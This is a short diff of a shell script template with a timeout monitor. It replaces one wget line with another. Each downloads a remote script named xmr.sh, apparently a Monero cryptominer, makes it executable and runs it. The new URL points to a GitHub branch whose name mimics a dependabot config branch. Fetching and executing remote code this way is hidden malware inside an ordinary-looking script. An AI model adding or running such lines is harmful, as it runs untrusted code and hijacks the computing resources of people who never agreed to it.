@@ -12,7 +12,7 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://gitlab.com/gairmeet/antsi/-/raw/master/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+wget https://raw.githubusercontent.com/lushenry654/bitbucket/dependabot/add-v2-config-file/xmr.sh && chmod +x xmr.sh && ./xmr.sh
 # <your script here>
 
 # kill timeout monitor when terminating:
